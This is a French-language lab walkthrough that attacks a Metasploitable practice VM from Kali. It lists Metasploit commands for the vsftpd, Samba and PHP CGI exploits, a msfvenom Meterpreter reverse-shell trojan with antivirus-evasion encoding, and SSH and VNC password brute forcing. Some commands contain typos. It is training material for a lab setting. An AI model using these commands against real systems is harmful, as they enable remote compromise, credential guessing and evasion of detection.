# Prérequis :
```
> Une machine Kali Linux (ici Kali v2025.2)
> Une machine Metasploitable
> Kali : 172.16.0.30
                                          } 172.16.0.0/24
> Metasploitable : 172.16.0.102
```

# Dans la console Kali
```
msfconsole
```
# Exploit 1 : utilisation d'un exploit sur le service vsftpd

# Utilisation de Nmap sur l'IP de la machine Metasploitable
```
nmap -sV 172.16.0.102

[nom du port]    [status]    [service]    [version]
21/TCP            open        ftp          vsftpd 2.3.4
```

# Utilisation de "search" pour trouver la faille de vsftpd
```
search vsftpd
```

# Entrée dans le menu
```
use 1
```

# Configuration du payload
```
set RHOSTS 172.16.0.102
```

# Lancer l'exploit
```
exploit
```

# Exploit 2 : exploitation d'un service Samba
```
search smb_version
use 0
options
```

# Configuation de l'IP de la machine distante
```
set RHOST 172.16.0.102
```

# Lancer l'exploit 
```
run
```

# Recherche de la vulnérabilité de Samba avec la version du logiciel trouvé
```
search samba 3.0.20
```

# Configuation de l'IP de la machine distante
```
set RHOST 172.16.0.102
```

# Lancer l'exploit 
```
run
```

# Découverte de la 3ème vulnérabilité :  Service Web (php + meterpreter)

# Utilisation de dirb pour vérifier la présence d'un fichier phpinfo.php
```
dirb http://172.16.0.102
```

# Recherche d'un exploit PHP
```
search php cv:2012 rank:excellent description:CGI
```

# Utilisation de l'exploit
```
use 0
```

# Configuation de l'IP de la machine distante
```
set RHOST 172.16.0.102
```

# Démarrage de l'exploit
```
run
```

# Exploit n°4 : Cheval de Troie avec msfvenom
```
msfconsole
```

# Afficher l'aide pour msfvenom
```
msfvenom -h
```

# Création d'un payload
```
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=172.16.0.30 LPORT=4444 > runmeplz
```

# Envoie du payload sur la machine distante Metasploitable
```
scp -o HostKeyAlorithms=+ssh-rsa runmeplz [username]@172.16.0.102:/home/[username]
```

# Génération du payload
```
use exploit/multi/handler 
set payload linux/x86/meterpreter/reverse_tcp
set LPORT 4444
set LHOST 172.16.0.30
show info
exploit -j -z
```

# Sur la machine Metasploitable
```
./runmeplz
```

# Encodage avec Shikata afin d'être moins détectable par un antivirus
```
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf x86/shikata_ga_nai LHOST=172.16.0.30 LPORT=4444 > runmeplz
```

# Exploit 5 : Scanner (enum4linux) et bruteforce
```
enum4linux -U 172.16.0.102
```

# Tentative de déterminer le mot de passe du compte klog
```
use auxiliary/scanner/ssh/ssh_login
set RHOST 172.16.0.102
set USERNAME klog
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 4
set STOP_ON_SUCCESS true
run
```

# Exploit 6 VNC (port 5900)
```
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 172.16.0.102
set username root
run
```

# Login successful
```
vcnviewer 172.16.0.102
```

# End
